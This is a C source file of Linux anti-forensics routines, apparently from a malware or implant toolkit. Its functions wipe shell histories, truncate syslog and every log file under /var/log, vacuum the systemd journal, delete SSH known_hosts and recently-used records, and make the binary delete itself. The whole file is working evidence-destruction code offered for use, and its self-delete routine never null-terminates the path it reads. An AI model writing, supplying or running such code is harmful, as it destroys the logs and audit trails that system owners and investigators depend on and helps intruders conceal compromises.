/* Forensics and cleanup functions for Linux */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

int linux_forensics_wipe_bash_history(void) {
    struct passwd* pw = getpwuid(getuid());
    if (!pw) return -1;

    char path[256];
    snprintf(path, sizeof(path), "%s/.bash_history", pw->pw_dir);

    FILE* fp = fopen(path, "w");
    if (!fp) return -1;

    fclose(fp);
    remove(path);

    return 0;
}

int jocky_linux_cleanup_syslog(void) {
    /* Clear syslog entries */
    system("truncate -s 0 /var/log/syslog 2>/dev/null");
    system("truncate -s 0 /var/log/messages 2>/dev/null");
    return 0;
}

int jocky_linux_cleanup_journal(void) {
    /* Clear systemd journal */
    system("journalctl --vacuum-time=1s 2>/dev/null");
    return 0;
}

int jocky_wipe_artifacts(void) {
    /* Wipe various artifact locations */
    system("rm -f ~/.ssh/known_hosts 2>/dev/null");
    system("rm -f ~/.bash_history 2>/dev/null");
    system("rm -f ~/.zsh_history 2>/dev/null");
    return 0;
}

int jocky_wipe_prefetch(void) {
    /* Clear prefetch cache (Linux specific) */
    system("rm -rf ~/.local/share/recently-used.* 2>/dev/null");
    return 0;
}

int jocky_clear_logs(void) {
    /* Clear all log files */
    system("find /var/log -type f -name '*.log' -exec truncate -s 0 {} \\; 2>/dev/null");
    return 0;
}

int jocky_clear_srum(void) {
    /* SRUM is Windows only - no-op on Linux */
    return 0;
}

int jocky_self_delete(void) {
    /* Delete the current binary */
    char path[256];
    if (readlink("/proc/self/exe", path, sizeof(path) - 1) > 0) {
        remove(path);
        return 0;
    }
    return -1;
}

int jocky_cleanup_all(void) {
    linux_forensics_wipe_bash_history();
    jocky_linux_cleanup_syslog();
    jocky_linux_cleanup_journal();
    jocky_wipe_artifacts();
    jocky_wipe_prefetch();
    jocky_clear_logs();
    return 0;
}
